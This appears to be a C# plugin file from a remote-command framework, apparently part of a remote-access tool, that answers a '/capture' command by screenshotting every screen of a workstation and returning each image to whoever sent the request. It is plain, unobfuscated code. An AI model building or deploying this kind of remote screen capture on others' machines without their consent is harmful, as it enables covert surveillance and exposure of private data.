﻿using CapPlugin.Core;
using Common.Extensions;
using Common.Models;
using Contracts;
using System.Drawing;

namespace Plugins.CapScrn
{

    public class CapScrnPlugin : IPlugin
    {
        public CapScrnPlugin()
        {
            Pattern = "/capture";
            Description = "Get a screenshot of the workstation.";
        }

        public override void Execute(Request req)
        {
            var api = new DesktopApi();

            api.Invoke(async (screens) =>
            {
                foreach (Bitmap screen in screens)
                {
                    var result = new Response(screen.ToMemStream(), req.MessageId);

                    await ResultHandler(result);
                }
            });
        }
    }
}
